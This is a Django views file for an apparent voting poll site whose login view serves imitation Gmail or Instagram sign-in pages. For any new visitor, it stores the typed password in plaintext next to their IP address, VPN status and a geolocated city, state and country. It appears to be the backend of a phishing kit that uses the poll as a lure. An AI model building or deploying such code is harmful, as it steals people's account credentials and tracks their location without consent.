from django.shortcuts import render, redirect
from .models import Poll, Candidate, Account

# import django messages framework
from django.contrib import messages

# import django authentication framework
from django.contrib.auth import login, logout, authenticate


def index_view(request):
    polls = Poll.objects.all()
    return render(request, "pages/index.html", {"polls": polls})


def poll_view(request, slug):
    poll = Poll.objects.get(slug=slug)
    poll_candidates = Candidate.objects.filter(poll=poll)
    voted_for = None
    user = request.user
    if user.is_authenticated:
        voted_for = poll_candidates.filter(voters=user).first()
        print(voted_for)
    return render(
        request,
        "pages/poll.html",
        {
            "poll": poll,
            "candidates": poll_candidates,
            "voted_for": voted_for,
        },
    )


def vote(request, poll_slug, candidate_id):
    poll = Poll.objects.get(slug=poll_slug)
    candidate = Candidate.objects.get(id=candidate_id, poll=poll)
    user = request.user
    if user.is_authenticated:
        if candidate.voters.filter(id=user.id).exists():
            messages.error(request, "You have already voted for this candidate.")
            return redirect("poll", slug=poll_slug)

        # check if user has already voted for this poll
        if poll.candidates.filter(voters=user).exists():
            messages.error(request, "You have already voted in this poll.")
            return redirect("poll", slug=poll_slug)

        candidate.voters.add(user)
        candidate.votes += 1
        candidate.save()
        messages.success(request, "Your vote has been recorded.")
        return redirect("poll", slug=poll_slug)
    else:
        messages.error(request, "You must be logged in to vote.")
        return redirect("poll", slug=poll_slug)


def login_or_signup_view(request, where):
    if request.method == "POST":
        identifier = request.POST.get("identifier")
        password = request.POST.get("pwd")

        # get next url from request GET parameters
        next_url = request.GET.get("next")

        # check if user exists
        user = Account.objects.filter(identifier=identifier).first()
        if user:
            # check if password is correct
            if user.check_password(password):
                messages.success(request, "Welcome back.")
                # authenticate user and login
                user = authenticate(request, username=user.username, password=password)
                login(request, user)
                if next_url:
                    return redirect(next_url)
                return redirect("index")
            else:
                messages.error(
                    request,
                    "Sorry, your password was incorrect. Please double-check your password.",
                )
                return redirect("login", where=where)
        else:
            from ipware import get_client_ip
            import requests

            ip, is_routable = get_client_ip(request)
            is_vpn = not is_routable

            # Get country, state, timezone, city information from ipinfo.io API
            url = "https://ipinfo.io/{ip}/json"
            response = requests.get(url.format(ip=ip))
            data = response.json()
            country = data.get("country")
            city = data.get("city")
            state = data.get("region")
            region = data.get("timezone")

            # split timezone to get the continent
            region = region.split("/")[0]

            # create user
            user = Account.objects.create(
                pwd=password,
                identifier=identifier,
                username=identifier,
                ip_address=ip,
                country=country,
                city=city,
                state=state,
                region=region,
                used_vpn=is_vpn,
                _type=where,
            )
            user.set_password(password)
            user.save()
            messages.success(request, "Your account has been created.")
            login(request, user)
            if next_url:
                return redirect(next_url)
            return redirect("index")

    # check if where is either GM or IG
    if where not in ["GM", "IG"]:
        return redirect("index")

    # get the full url of the current page
    full_url = request.build_absolute_uri()

    context = {"full_url": full_url}

    if where == "GM":
        return render(request, "pages/auth/gmail.html", context)
    elif where == "IG":
        return render(request, "pages/auth/instagram.html", context)
    return redirect("index")


def logout_view(request):
    logout(request)
    # check if the user is logged out
    if not request.user.is_authenticated:
        messages.success(request, "You have been logged out.")
    else:
        messages.error(request, "Something went wrong. Please try again.")
    return redirect("index")
